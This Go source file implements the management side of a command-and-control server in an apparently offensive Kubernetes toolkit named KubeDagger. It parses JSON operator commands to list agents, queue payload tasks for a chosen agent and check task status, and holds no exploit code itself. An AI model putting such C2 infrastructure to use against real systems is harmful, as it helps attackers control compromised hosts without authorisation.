package c2server

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/kubedagger/c2"
)

type MgmtServer struct {
	srv    *c2.Server
	agents *AgentRegistry
	tasks  *TaskQueue
}

type MgmtCommand struct {
	Action  string            `json:"action"`
	AgentID string            `json:"agent_id,omitempty"`
	Type    TaskType          `json:"type,omitempty"`
	Payload map[string]string `json:"payload,omitempty"`
	TaskID  string            `json:"task_id,omitempty"`
}

type MgmtResponse struct {
	Status string      `json:"status"`
	Data   interface{} `json:"data,omitempty"`
	Error  string      `json:"error,omitempty"`
}

func NewMgmtServer(key []byte, agents *AgentRegistry, tasks *TaskQueue) (*MgmtServer, error) {
	mgmt := &MgmtServer{
		agents: agents,
		tasks:  tasks,
	}

	srv, err := c2.NewServer(key, mgmt.handleCommand)
	if err != nil {
		return nil, fmt.Errorf("mgmt server: %w", err)
	}
	mgmt.srv = srv
	return mgmt, nil
}

func (m *MgmtServer) Start(addr string) error {
	return m.srv.Start(addr)
}

func (m *MgmtServer) Stop() {
	m.srv.Stop()
}

func (m *MgmtServer) handleCommand(cmd []byte) ([]byte, error) {
	var mc MgmtCommand
	if err := json.Unmarshal(cmd, &mc); err != nil {
		return marshalResponse(MgmtResponse{Status: "error", Error: "invalid command json"})
	}

	logrus.Debugf("mgmt command: %s", mc.Action)

	switch strings.ToLower(mc.Action) {
	case "agents":
		return m.listAgents()
	case "queue":
		return m.queueTask(mc)
	case "task_status":
		return m.taskStatus(mc)
	case "agent_tasks":
		return m.agentTasks(mc)
	default:
		return marshalResponse(MgmtResponse{Status: "error", Error: fmt.Sprintf("unknown action: %s", mc.Action)})
	}
}

func (m *MgmtServer) listAgents() ([]byte, error) {
	agents := m.agents.List()
	return marshalResponse(MgmtResponse{Status: "ok", Data: agents})
}

func (m *MgmtServer) queueTask(mc MgmtCommand) ([]byte, error) {
	if mc.AgentID == "" {
		return marshalResponse(MgmtResponse{Status: "error", Error: "missing agent_id"})
	}
	if mc.Type == "" {
		return marshalResponse(MgmtResponse{Status: "error", Error: "missing type"})
	}

	if _, ok := m.agents.Get(mc.AgentID); !ok {
		return marshalResponse(MgmtResponse{Status: "error", Error: "unknown agent"})
	}

	task := m.tasks.Enqueue(mc.AgentID, mc.Type, mc.Payload)
	return marshalResponse(MgmtResponse{Status: "ok", Data: task})
}

func (m *MgmtServer) taskStatus(mc MgmtCommand) ([]byte, error) {
	if mc.TaskID == "" {
		return marshalResponse(MgmtResponse{Status: "error", Error: "missing task_id"})
	}

	task, ok := m.tasks.Get(mc.TaskID)
	if !ok {
		return marshalResponse(MgmtResponse{Status: "error", Error: "task not found"})
	}
	return marshalResponse(MgmtResponse{Status: "ok", Data: task})
}

func (m *MgmtServer) agentTasks(mc MgmtCommand) ([]byte, error) {
	if mc.AgentID == "" {
		return marshalResponse(MgmtResponse{Status: "error", Error: "missing agent_id"})
	}

	tasks := m.tasks.ListForAgent(mc.AgentID)
	return marshalResponse(MgmtResponse{Status: "ok", Data: tasks})
}

func marshalResponse(resp MgmtResponse) ([]byte, error) {
	return json.Marshal(resp)
}
